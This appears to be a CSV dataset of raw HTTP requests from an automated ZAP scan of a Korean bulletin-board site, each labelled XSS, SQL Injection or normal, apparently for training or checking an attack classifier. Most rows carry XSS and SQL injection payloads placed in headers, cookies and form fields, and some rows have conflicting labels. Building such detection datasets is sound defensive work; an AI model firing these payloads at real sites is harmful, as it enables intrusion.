,id,combined_request,label_x,gpt_label
760,3bb46709-b676-4e55-b1ee-6246492b7fa1,"POST /bbs/login_check.php HTTP/1.1\r\nhost:  >.<scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 72\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=ZAP&mb_password=ZAP&auto_login=1",XSS,XSS
761,c94a93de-036d-4e50-b20d-5a5c32ce5997,GET /bbs/_tail.sub.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' <img src=x onerror=prompt()>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,XSS
762,6fcd0653-0827-4975-b222-4f1781ca05b3,"GET /bbs/ajax.autosavelist.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/0W45pz4p\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",SQL Injection,SQL Injection
763,6f6016a6-e8d8-40a6-b254-6585f805d78a,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 973\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=30W45pz4p&sca=&sfl=&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
764,1548e3a2-55b7-4ddc-b2ad-73242692df72,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 973\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=&sfl=&stx=0W45pz4p&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
765,00ee21e2-ace6-4838-b2cf-2e0a83002106,"GET /bbs/ajax.autosavelist.php?query=query0W45pz4p HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",SQL Injection,SQL Injection
766,487d9692-53b8-4c66-b2dd-e810a721b559,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 1016\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sfl=&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
767,4745e3a4-c892-49fd-b2f1-8ea93dc2b2e1,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx=ZAP\r\ncontent-length: 84\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=0W45pz4p&sst=wr_datetime&sod=asc&page=1&sw=",normal,normal
768,e2ba0e2c-9749-44dc-b2f2-c6e7c7e81003,GET /bbs/_head.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' <img src=x onerror=prompt()>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,XSS
769,7c347308-9960-4b3b-b2f5-12dbf7644336,"POST /bbs/password_lost2.php HTTP/1.1\r\nhost:  >.<scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password_lost.php\r\ncontent-length: 28\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+AND+%271%27%3D%271%27+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\nmb_email=ZAP&captcha_key=ZAP",XSS,XSS
770,b8e2358c-de6c-4849-b2f7-df984fd0e3c3,"GET /bbs/ajax.autosavedel.php HTTP/1.1\r\nhost: ' <scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
771,9f5c285c-ede3-4126-b398-e6fc81a6ae66,GET /bbs/ajax.autosaveload.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' <scrIpt>alert(1);</scRipt>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D2+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,SQL Injection
772,c4a5bc3a-601c-4d0d-b410-fe2da4f6e4be,"POST /bbs/new.php?query=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php\r\ncontent-length: 49\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
773,b62d5519-0d24-4090-b458-c7d45e6217b4,"GET /bbs/_tail.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: ' .<scrIpt>alert(1);</scRipt>\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
774,ff53d441-fd03-4f49-b471-04fdeddeab03,GET /bbs/ajax.autosave.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' .<scrIpt>alert(1);</scRipt>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,XSS
775,0872e14c-27fe-48cf-b4c8-3e882a585ec4,POST /bbs/delete.php?token=1698992570654491ba1d169 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ;\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=d&wr_id=4\r\ncontent-length: 118\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=d&bo_table=free&wr_id=4&comment_id=&sfl=&stx=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&page=1&wr_password=ZAP,XSS,XSS
776,202f559b-f8cc-41c6-b4f0-92e99cb4719c,GET /bbs/ajax.autosavelist.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' .<scrIpt>alert(1);</scRipt>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,XSS
777,654800cd-c13f-440e-b52a-c31ff8e427a8,POST /bbs/delete.php?token=1698992570654491ba1d169 HTTP/1.1\r\nhost: javascript:alert(1);\r\nuser-agent: ;\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=d&wr_id=4\r\ncontent-length: 70\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=d&bo_table=free&wr_id=4&comment_id=&sfl=&stx=&page=1&wr_password=ZAP,XSS,XSS
778,df878dcd-a301-4b66-b530-5bd83e8048f6,"POST /bbs/new.php?query=%22%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php\r\ncontent-length: 49\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
779,0f30736e-28cd-45b2-b560-52e2a9253d6e,"GET /bbs/_head.php HTTP/1.1\r\nhost: ' .<scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
780,ebc07fa6-fb91-4e27-b5a8-a8ed4376367f,"GET /?query=%22%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nDNT: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14&&\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D1+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
781,0da21b46-94ef-44ae-b5c7-d24aed99dd49,"POST /bbs/login_check.php HTTP/1.1\r\nhost:  ><img src=x onerror=prompt()>\r\nProxy-Connection: keep-alive\r\nContent-Length: 59\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; e1192aefb64683cc97abb83c71057733=cWE%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-\r\nx-zap-scan-id: 40012\r\n\r\nurl=%252F&mb_id=%60+or+a%3Da+--&mb_password=%60+or+a%3Da+--",SQL Injection,XSS
782,1af311fe-f82e-4674-b5cc-9191bb5e6ced,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&c_id=15&page=1&sod=desc&sop=and&sst=wr_hit&w=c&wr_id=14\r\ncontent-length: 200\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=c&bo_table=free&wr_id=14&comment_id=15&sca=&sfl=&stx=&spt=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&page=1&is_good=&wr_content=&wr_name=ZAP&wr_password=ZAP&captcha_key=ZAP&wr_secret=secret",XSS,XSS
783,53dee586-d5eb-4fa5-b637-79633aa91fb5,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 973\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=0W45pz4p&sfl=&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
